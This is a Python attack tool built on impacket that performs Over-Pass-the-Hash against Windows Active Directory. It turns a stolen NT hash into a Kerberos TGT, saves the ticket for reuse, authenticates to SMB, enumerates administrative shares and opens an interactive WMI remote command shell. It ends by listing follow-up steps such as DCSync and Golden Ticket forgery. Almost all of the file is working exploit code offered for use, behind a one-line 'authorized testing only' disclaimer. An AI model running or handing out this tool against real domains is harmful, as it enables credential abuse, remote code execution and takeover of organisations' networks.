#!/usr/bin/env python3


import sys
import os
import signal
import time
import subprocess
import socket
from typing import Optional, Tuple

# impacket WMI/DCOM modules
try:
    from impacket.dcerpc.v5.dcom import wmi as wmi_mod
    from impacket.dcerpc.v5.dcomrt import DCOMConnection
    from impacket.dcerpc.v5.dtypes import NULL
    _WMI_AVAILABLE = True
except ImportError:
    _WMI_AVAILABLE = False

# Force UTF-8 output
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

# ─────────────────────────────────────────────
#  COLORS
# ─────────────────────────────────────────────
class Colors:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BLUE   = "\033[94m"
    RESET  = "\033[0m"
    BOLD   = "\033[1m"

def cprint(text: str, color: str = "WHITE", bold: bool = False):
    prefix   = Colors.BOLD if bold else ""
    clr_code = getattr(Colors, color.upper(), Colors.WHITE)
    print(f"{prefix}{clr_code}{text}{Colors.RESET}")

# ─────────────────────────────────────────────
#  SIGNAL HANDLER
# ─────────────────────────────────────────────
def signal_handler(sig, frame):
    cprint("\n\n[!] Interrupted by user (Ctrl+C). Exiting.", "RED")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ─────────────────────────────────────────────
#  BANNER
# ─────────────────────────────────────────────
BANNER = """
  ╔═══════════════════════════════════════════════════════╗
  ║     Over-Pass-the-Hash (OPtH) / Pass-the-Key          ║
  ║     NT Hash  →  Kerberos TGT  →  Domain Access        ║
  ╚═══════════════════════════════════════════════════════╝
"""

# ─────────────────────────────────────────────
#  HASH VALIDATION & CONVERSION
# ─────────────────────────────────────────────
def normalize_hash(raw: str) -> Optional[str]:
    if not raw:
        return None
    raw = raw.strip()
    # pwdump format: user:rid:lmhash:nthash:::
    parts = raw.split(":")
    if len(parts) >= 4:
        candidate = parts[3].strip().lower()
        if len(candidate) == 32 and all(c in "0123456789abcdef" for c in candidate):
            return candidate
    # LM:NT or plain
    if ":" in raw:
        raw = raw.rsplit(":", 1)[-1]
    raw = raw.strip().lower()
    if len(raw) == 32 and all(c in "0123456789abcdef" for c in raw):
        return raw
    return None

def hex_to_bytes(hex_str: str) -> bytes:
    return bytes.fromhex(hex_str)

def lmhash_bytes() -> bytes:
    return bytes.fromhex("aad3b435b51404eeaad3b435b51404ee")

# ─────────────────────────────────────────────
#  INPUT HELPERS
# ─────────────────────────────────────────────
def ping_host(host: str) -> bool:
    if os.name == "nt":
        cmd = ["ping", "-n", "1", "-w", "2000", host]
    else:
        cmd = ["ping", "-c", "1", "-W", "2", host]
    try:
        return subprocess.run(cmd, capture_output=True, timeout=5).returncode == 0
    except Exception:
        return False

def resolve_fqdn(ip: str, domain: str) -> str:
    """
    Resolve IP to FQDN for Kerberos SPN matching.
    FIX: Always ensure we return a full FQDN with domain suffix.
    Kerberos SPN lookup requires FQDN — IP causes KDC_ERR_S_PRINCIPAL_UNKNOWN.
    """
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        # Ensure it's a full FQDN
        if domain and not hostname.lower().endswith(domain.lower()):
            hostname = f"{hostname}.{domain}"
        return hostname
    except Exception:
        # If reverse DNS fails, construct FQDN from domain
        cprint(f"  [!] Reverse DNS failed for {ip}. Enter hostname manually.", "YELLOW")
        return ip

def gather_inputs() -> Tuple[str, str, str, str, str, str]:
    cprint("\n  ┌── Target Configuration ─────────────────────────────┐", "YELLOW", bold=True)

    # Domain
    while True:
        domain = input(f"  {Colors.CYAN}Domain (e.g. Domain.Com)        → {Colors.RESET}").strip()
        if domain and "." in domain:
            break
        cprint("  [!] Enter a valid domain like Domain.Com", "RED")

    # Username
    while True:
        username = input(f"  {Colors.CYAN}Username                       → {Colors.RESET}").strip()
        if username:
            break
        cprint("  [!] Username cannot be empty.", "RED")

    # DC IP
    while True:
        dc_ip = input(f"  {Colors.CYAN}DC IP Address                  → {Colors.RESET}").strip()
        if dc_ip:
            break
        cprint("  [!] DC IP cannot be empty.", "RED")

    # NT Hash
    while True:
        raw = input(f"  {Colors.CYAN}NT Hash (32 hex / LM:NT / dump)→ {Colors.RESET}").strip()
        nthash = normalize_hash(raw)
        if nthash:
            break
        cprint("  [!] Invalid hash. Must be 32 hex chars.", "RED")

    # FIX: Ask user to confirm/enter FQDN instead of auto-resolving
    resolved = resolve_fqdn(dc_ip, domain)
    cprint(f"\n  [*] Auto-resolved hostname: {resolved}", "CYAN")
    manual = input(
        f"  {Colors.CYAN}Target FQDN (Enter to use '{resolved}') → {Colors.RESET}"
    ).strip()
    target_host = manual if manual else resolved

    # Ensure FQDN has domain suffix for Kerberos SPN
    if domain and "." not in target_host:
        target_host = f"{target_host}.{domain}"
        cprint(f"  [*] Appended domain → {target_host}", "YELLOW")

    spn_input = input(
        f"  {Colors.CYAN}Service SPN (Enter for cifs/{target_host}) → {Colors.RESET}"
    ).strip()
    service_spn = spn_input if spn_input else f"cifs/{target_host}"

    cprint("  └────────────────────────────────────────────────────┘\n", "YELLOW")
    return domain, username, dc_ip, nthash, service_spn, target_host


# ═════════════════════════════════════════════════════════════════════
#  CORE ATTACK — OVER-PASS-THE-HASH
# ═════════════════════════════════════════════════════════════════════

def request_tgt(username, domain, nthash_hex, dc_ip):
    from impacket.krb5.kerberosv5 import getKerberosTGT
    from impacket.krb5.types import Principal
    from impacket.krb5 import constants

    realm        = domain.upper()
    client_name  = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    nthash_bytes = hex_to_bytes(nthash_hex)
    lmhash_b     = lmhash_bytes()
    aes_key      = b""

    cprint(f"  [*] Sending AS-REQ to DC {dc_ip} for {username}@{realm}...", "CYAN")
    cprint("      (Using NT hash as RC4-HMAC key — OPtH technique)", "WHITE")

    tgt, cipher, old_session_key, session_key = getKerberosTGT(
        clientName=client_name,
        password="",
        domain=realm,
        lmhash=lmhash_b,
        nthash=nthash_bytes,
        aesKey=aes_key,
        kdcHost=dc_ip,
        requestPAC=True
    )
    return tgt, cipher, old_session_key, session_key, realm


def save_tgt_ccache(tgt, username, domain, old_session_key, session_key, output_file="ticket.ccache"):
    from impacket.krb5.ccache import CCache
    ccache = CCache()
    ccache.fromTGT(tgt, old_session_key, session_key)
    ccache.saveFile(output_file)
    return output_file


def request_service_ticket(tgt, cipher, session_key, username, domain, service_spn, dc_ip):
    from impacket.krb5.kerberosv5 import getKerberosTGS
    from impacket.krb5.types import Principal
    from impacket.krb5 import constants

    realm       = domain.upper()
    server_name = Principal(service_spn, type=constants.PrincipalNameType.NT_SRV_INST.value)

    cprint(f"  [*] Requesting Service Ticket for: {service_spn}", "CYAN")

    tgs, cipher_tgs, old_session_key_tgs, session_key_tgs = getKerberosTGS(
        serverName=server_name,
        domain=realm,
        kdcHost=dc_ip,
        tgt=tgt,
        cipher=cipher,
        sessionKey=session_key
    )
    return tgs, cipher_tgs, old_session_key_tgs, session_key_tgs


def smb_kerberos_login(target_ip, target_host, username, domain, nthash_hex, dc_ip):
    from impacket.smbconnection import SMBConnection

    cprint(f"\n  [*] Connecting to SMB on {target_ip} via Kerberos...", "CYAN")
    cprint(f"      Using FQDN for SPN: {target_host}", "WHITE")

    # FIX: First arg must be the FQDN (for SPN matching), second is the IP (for TCP connection)
    smb = SMBConnection(target_host, target_ip, sess_port=445, timeout=30)

    lmhash_hex = "aad3b435b51404eeaad3b435b51404ee"

    # NOTE: kerberosLogin takes hex strings, NOT bytes (different from getKerberosTGT)
    smb.kerberosLogin(
        user=username,
        password="",
        domain=domain,
        lmhash=lmhash_hex,
        nthash=nthash_hex,
        aesKey="",
        kdcHost=dc_ip
    )
    return smb


def enumerate_shares(smb) -> list:
    shares = []
    try:
        for share in smb.listShares():
            name = share["shi1_netname"][:-1].strip()
            if name:
                shares.append(name)
    except Exception as e:
        cprint(f"  [!] Share enumeration error: {e}", "YELLOW")
    return shares


# ─────────────────────────────────────────────
#  DISPLAY HELPERS
# ─────────────────────────────────────────────
def print_tgt_info(tgt, username, domain):
    try:
        from pyasn1.codec.der import decoder
        from impacket.krb5.asn1 import AS_REP
        decoded = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        cprint("  [+] TGT Details:", "GREEN")
        try:
            cprint(f"      Realm  : {str(decoded['crealm'])}", "WHITE")
        except Exception:
            pass
        try:
            cprint(f"      Client : {str(decoded['cname']['name-string'][0])}", "WHITE")
        except Exception:
            pass
    except Exception:
        cprint(f"      User   : {username}@{domain.upper()}", "WHITE")
        cprint(f"      Size   : {len(tgt)} bytes", "WHITE")


def display_ticket_info(ccache_path, username, domain):
    import datetime
    abs_path = os.path.abspath(ccache_path)
    expiry   = datetime.datetime.now() + datetime.timedelta(hours=10)

    cprint("\n  ┌─ Saved Ticket ────────────────────────────────────────┐", "GREEN")
    cprint(f"  │  Path    : {abs_path}", "WHITE")
    cprint(f"  │  Expires : ~{expiry.strftime('%Y-%m-%d %H:%M')} (approx 10h)", "YELLOW")
    cprint("  │", "WHITE")
    cprint("  │  Reuse — Linux:", "CYAN")
    cprint(f"  │    export KRB5CCNAME={abs_path}", "WHITE")
    cprint(f"  │    impacket-wmiexec -k -no-pass {domain}/{username}@<target>", "WHITE")
    cprint("  └────────────────────────────────────────────────────────┘", "GREEN")


# ─────────────────────────────────────────────
#  WMI INTERACTIVE SHELL
# ─────────────────────────────────────────────
def launch_wmi_shell(target_ip, target_host, username, domain, nthash_hex, dc_ip, smb_conn):
    """
    WMI shell via Kerberos/DCOM.

    FIX: DCOMConnection must use target_host (FQDN), NOT target_ip.
    Kerberos SPN for WMI is HOST/<fqdn> — passing IP causes
    KDC_ERR_S_PRINCIPAL_UNKNOWN because no HOST/<ip> SPN exists.
    """
    if not _WMI_AVAILABLE:
        cprint("  [-] WMI needs impacket DCOM modules.", "RED")
        return

    lmhash       = "aad3b435b51404eeaad3b435b51404ee"
    out_filename = f"__wmi_{os.getpid()}"
    share        = "C$"
    out_unc      = f"\\\\127.0.0.1\\C$\\{out_filename}"

    cprint(f"\n  [*] Connecting to WMI on {target_host} ({target_ip})...", "CYAN")
    cprint(f"      SPN will be: HOST/{target_host}", "WHITE")

    try:
        # FIX: Use target_host (FQDN) as first arg — required for Kerberos SPN lookup
        # target_ip is passed separately via the DCOM resolver
        dcom = DCOMConnection(
            target_host,        # ← FQDN for SPN matching (was target_ip — BUG)
            username=username,
            password="",
            domain=domain,
            lmhash=lmhash,
            nthash=nthash_hex,
            aesKey="",
            oxidResolver=True,
            doKerberos=True,
            kdcHost=dc_ip
        )

        iface         = dcom.CoCreateInstanceEx(wmi_mod.CLSID_WbemLevel1Login,
                                                wmi_mod.IID_IWbemLevel1Login)
        iWbemLogin    = wmi_mod.IWbemLevel1Login(iface)
        iWbemServices = iWbemLogin.NTLMLogin("//./root/cimv2", NULL, NULL)
        iWbemLogin.RemRelease()

        win32Process, _ = iWbemServices.GetObject("Win32_Process")

        cprint("\n  [+] WMI Shell ready!", "GREEN", bold=True)
        cprint(f"      Connected : {domain}\\{username}@{target_host}", "GREEN")
        cprint("      Type 'exit' to quit.\n", "WHITE")

        import re as _re

        # Track current working directory — makes cd work like real CMD
        cwd = "C:\\"

        try:
            while True:
                try:
                    cmd_in = input(
                        f"  {Colors.YELLOW}[WMI] {domain}\\{username}:{cwd}> {Colors.RESET}"
                    ).strip()
                except (EOFError, KeyboardInterrupt):
                    cprint("\n  [*] Shell interrupted.", "YELLOW")
                    break

                if not cmd_in:
                    continue
                if cmd_in.lower() in ("exit", "quit", "q"):
                    cprint("  [*] Closing shell...", "YELLOW")
                    break

                # /v:on enables delayed expansion — !CD! reflects cwd AFTER cd runs
                # %CD% is evaluated at parse time so it never updates with cd
                full_cmd = (
                    f"cmd.exe /Q /v:on /c "
                    f"(cd /d \"{cwd}\" && {cmd_in} & echo __CWD_S__!CD!__CWD_E__) "
                    f"1> {out_unc} 2>&1"
                )
                try:
                    win32Process.Create(full_cmd, "C:\\", None)
                    try:
                        time.sleep(1.5)
                    except KeyboardInterrupt:
                        cprint("\n  [*] Command interrupted.", "YELLOW")
                        continue
                    try:
                        buf = []
                        smb_conn.getFile(share, out_filename, lambda data: buf.append(data))
                        raw = b"".join(buf).decode("utf-8", errors="replace")

                        # Extract new cwd from marker and update tracker
                        cwd_match = _re.search(r"__CWD_S__(.+?)__CWD_E__", raw)
                        if cwd_match:
                            cwd = cwd_match.group(1).strip()
                            out = _re.sub(r"__CWD_S__.+?__CWD_E__", "", raw).strip()
                        else:
                            out = raw.strip()

                        print(f"\n{out}\n" if out else "  (no output)\n")
                        try:
                            smb_conn.deleteFile(share, out_filename)
                        except Exception:
                            pass
                    except KeyboardInterrupt:
                        cprint("\n  [*] Read interrupted.", "YELLOW")
                        continue
                    except Exception as read_err:
                        cprint(f"  [!] Could not read output: {read_err}", "YELLOW")
                except Exception as exec_err:
                    cprint(f"  [-] Execution error: {exec_err}", "RED")

        except KeyboardInterrupt:
            cprint("\n  [*] Shell closed by user.", "YELLOW")
        finally:
            # Always disconnect cleanly — prevents terminal freeze
            try:
                dcom.disconnect()
            except Exception:
                pass
            cprint("  [+] WMI connection closed.\n", "GREEN")

    except Exception as e:
        cprint(f"\n  [-] WMI Shell failed: {e}", "RED")
        cprint("  Possible causes:", "YELLOW")
        cprint("    • Port 135 (RPC) not reachable", "YELLOW")
        cprint("    • WMI service not running on target", "YELLOW")
        cprint("    • Kerberos clock skew > 5 min", "YELLOW")
        cprint(f"    • FQDN used: {target_host} — verify this resolves correctly", "YELLOW")


# ═════════════════════════════════════════════════════════════════════
#  MAIN ATTACK FLOW
# ═════════════════════════════════════════════════════════════════════

def run_opth_attack(domain, username, dc_ip, nthash_hex, service_spn, target_host):

    # ── Step 1: TGT ──────────────────────────────────────────────────
    cprint("\n" + "═" * 60, "CYAN")
    cprint("  STEP 1 — Requesting Kerberos TGT via NT Hash", "CYAN", bold=True)
    cprint("  (AS-REQ with RC4-HMAC — hash used as encryption key)", "WHITE")
    cprint("═" * 60, "CYAN")

    try:
        tgt, cipher, old_session_key, session_key, realm = request_tgt(
            username=username, domain=domain,
            nthash_hex=nthash_hex, dc_ip=dc_ip
        )
        cprint("  [+] TGT obtained successfully!", "GREEN", bold=True)
        print_tgt_info(tgt, username, domain)
    except Exception as e:
        cprint(f"\n  [-] Failed to get TGT: {e}", "RED")
        cprint("  Possible causes:", "YELLOW")
        cprint("    • Wrong NT hash — use secretsdump to get the real hash", "YELLOW")
        cprint("    • Port 88 (Kerberos) blocked", "YELLOW")
        cprint("    • Account disabled or locked", "YELLOW")
        cprint("    • RC4 disabled on DC (Server 2019+)", "YELLOW")
        return False

    # ── Step 2: Save ccache ──────────────────────────────────────────
    cprint("\n" + "═" * 60, "CYAN")
    cprint("  STEP 2 — Saving TGT to ccache file", "CYAN", bold=True)
    cprint("═" * 60, "CYAN")

    ccache_file = f"{username}_{domain}.ccache"
    try:
        saved = save_tgt_ccache(tgt, username, domain, old_session_key, session_key, ccache_file)
        cprint(f"  [+] TGT saved: {saved}", "GREEN")
        display_ticket_info(saved, username, domain)
    except Exception as e:
        cprint(f"  [!] Could not save ccache (non-fatal): {e}", "YELLOW")

    # ── Step 3: Service Ticket ───────────────────────────────────────
    cprint("\n" + "═" * 60, "CYAN")
    cprint("  STEP 3 — Requesting Service Ticket (TGS-REQ)", "CYAN", bold=True)
    cprint(f"  Service: {service_spn}", "WHITE")
    cprint("═" * 60, "CYAN")

    try:
        tgs, cipher_tgs, _, session_key_tgs = request_service_ticket(
            tgt=tgt, cipher=cipher, session_key=session_key,
            username=username, domain=domain,
            service_spn=service_spn, dc_ip=dc_ip
        )
        cprint(f"  [+] Service Ticket obtained: {service_spn}", "GREEN", bold=True)
        cprint(f"      Size: {len(tgs)} bytes", "WHITE")
    except Exception as e:
        cprint(f"\n  [!] Service Ticket failed: {e}", "YELLOW")
        cprint("      Continuing to SMB login...", "YELLOW")

    # ── Step 4: Kerberos SMB Login ───────────────────────────────────
    cprint("\n" + "═" * 60, "CYAN")
    cprint("  STEP 4 — Authenticating to SMB via Kerberos", "CYAN", bold=True)
    cprint("  (NOT NTLM — pure Kerberos AP-REQ/AP-REP)", "WHITE")
    cprint("═" * 60, "CYAN")

    try:
        smb = smb_kerberos_login(
            target_ip=dc_ip, target_host=target_host,
            username=username, domain=domain,
            nthash_hex=nthash_hex, dc_ip=dc_ip
        )
        cprint("  [+] Kerberos SMB authentication SUCCESSFUL!", "GREEN", bold=True)
        cprint(f"      Authenticated as : {username}@{domain.upper()}", "GREEN")
        cprint("      Protocol         : Kerberos (NOT NTLM)", "GREEN")
    except Exception as e:
        cprint(f"\n  [-] Kerberos SMB login failed: {e}", "RED")
        cprint("  Possible causes:", "YELLOW")
        cprint("    • Port 88 blocked by firewall", "YELLOW")
        cprint("    • Clock skew > 5 minutes", "YELLOW")
        cprint("    • FQDN not resolving correctly", "YELLOW")
        cprint("\n  TGT was valid — use the .ccache file with other tools.", "GREEN")
        return False

    # ── Step 5: Enumerate Shares ─────────────────────────────────────
    cprint("\n" + "═" * 60, "CYAN")
    cprint("  STEP 5 — Enumerating Accessible Shares", "CYAN", bold=True)
    cprint("═" * 60, "CYAN")

    shares = enumerate_shares(smb)
    if shares:
        cprint("  [+] Accessible shares:", "GREEN")
        for share in shares:
            tag = " ← privileged" if share.upper() in ("C$", "ADMIN$") else ""
            cprint(f"      • {share}{tag}", "WHITE")
    else:
        cprint("  [!] No shares found or access denied.", "YELLOW")

    try:
        cprint(f"\n  [+] Target hostname : {smb.getServerName()}", "GREEN")
        cprint(f"  [+] Target OS       : {smb.getServerOS()}", "GREEN")
    except Exception:
        pass

    # ── Step 6: WMI Shell ────────────────────────────────────────────
    try:
        ans = input(
            f"\n  {Colors.CYAN}[?] Open interactive WMI shell? [y/N] {Colors.RESET}"
        ).strip().lower()
    except EOFError:
        ans = "n"

    if ans in ("y", "yes"):
        launch_wmi_shell(
            target_ip=dc_ip,
            target_host=target_host,   # ← FQDN passed correctly now
            username=username,
            domain=domain,
            nthash_hex=nthash_hex,
            dc_ip=dc_ip,
            smb_conn=smb
        )

    smb.logoff()

    # ── Summary ──────────────────────────────────────────────────────
    cprint("\n" + "═" * 60, "GREEN")
    cprint("  [✓] Over-Pass-the-Hash Attack Complete!", "GREEN", bold=True)
    cprint("  Summary:", "GREEN")
    cprint("    NT Hash    → Kerberos TGT  ✅", "WHITE")
    cprint("    TGT        → Service Ticket ✅", "WHITE")
    cprint("    Kerberos   → SMB Access     ✅", "WHITE")
    cprint("    NTLM used  → NO  (pure Kerberos)", "WHITE")
    if os.path.exists(ccache_file):
        cprint(f"    Saved TGT  → {ccache_file}", "WHITE")
    cprint("═" * 60, "GREEN")

    cprint("\n" + "═" * 60, "YELLOW")
    cprint("  NEXT STEPS (Post-Exploitation)", "YELLOW", bold=True)
    cprint("═" * 60, "YELLOW")
    cprint("  1. C$ / ADMIN$ — full disk read/write as Administrator", "WHITE")
    cprint("  2. DCSync      — dump all domain hashes incl. krbtgt", "WHITE")
    cprint("  3. Golden Ticket — forge tickets with krbtgt hash", "WHITE")
    cprint("  4. Lateral Movement — reuse ccache on other hosts", "WHITE")
    cprint("═" * 60, "YELLOW")

    return True


# ─────────────────────────────────────────────
#  PREREQUISITES CHECK
# ─────────────────────────────────────────────
def check_prerequisites():
    missing = []
    modules = [
        ("impacket.krb5.kerberosv5", "getKerberosTGT"),
        ("impacket.krb5.types",      "Principal"),
        ("impacket.krb5.ccache",     "CCache"),
        ("impacket.krb5.constants",  "PrincipalNameType"),
        ("impacket.smbconnection",   "SMBConnection"),
    ]
    for mod, attr in modules:
        try:
            m = __import__(mod, fromlist=[attr])
            if not hasattr(m, attr):
                missing.append(f"{mod}.{attr}")
        except ImportError:
            missing.append(mod)

    if missing:
        cprint("\n[!] Missing impacket modules:", "RED")
        for m in missing:
            cprint(f"    • {m}", "RED")
        cprint("\n    Fix: pip install impacket", "YELLOW")
        return False
    return True


# ─────────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────────
def main():
    cprint(BANNER, "CYAN", bold=True)
    cprint("  [!] For authorized penetration testing only.", "YELLOW")
    cprint("  [!] Ensure you have written permission before use.\n", "YELLOW")

    try:
        ans = input("  Continue? [y/N] ").strip().lower()
    except EOFError:
        return
    if ans not in ("y", "yes"):
        cprint("\n  [*] Aborted.", "RED")
        return

    cprint("\n[*] Checking prerequisites...", "CYAN")
    if not check_prerequisites():
        sys.exit(1)
    cprint("[+] All dependencies found.\n", "GREEN")

    domain, username, dc_ip, nthash_hex, service_spn, target_host = gather_inputs()

    cprint(f"[*] Checking connectivity to {dc_ip}...", "CYAN")
    if ping_host(dc_ip):
        cprint(f"  [+] {dc_ip} is reachable.", "GREEN")
    else:
        cprint(f"  [!] {dc_ip} did not respond to ping.", "YELLOW")
        try:
            if input("  Continue anyway? [y/N] ").strip().lower() not in ("y", "yes"):
                return
        except EOFError:
            return

    cprint("\n┌─ Attack Summary ────────────────────────────────────┐", "GREEN")
    cprint(f"  │  Domain      : {domain}", "WHITE")
    cprint(f"  │  Username    : {username}", "WHITE")
    cprint(f"  │  DC IP       : {dc_ip}", "WHITE")
    cprint(f"  │  NT Hash     : {nthash_hex[:8]}...{nthash_hex[-8:]}", "WHITE")
    cprint(f"  │  Target FQDN : {target_host}", "WHITE")
    cprint(f"  │  Service SPN : {service_spn}", "WHITE")
    cprint(f"  │  Attack      : Over-Pass-the-Hash (OPtH)", "WHITE")
    cprint(f"  │  Auth method : Kerberos RC4-HMAC with NT hash", "WHITE")
    cprint("  └─────────────────────────────────────────────────────┘\n", "GREEN")

    success = run_opth_attack(
        domain=domain, username=username, dc_ip=dc_ip,
        nthash_hex=nthash_hex, service_spn=service_spn,
        target_host=target_host
    )

    if not success:
        cprint("\n[!] Attack did not complete fully.", "YELLOW")
        cprint("    Check errors above for details.", "YELLOW")

    cprint("\n[*] Done.\n", "CYAN")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted.", "RED")
        sys.exit(1)
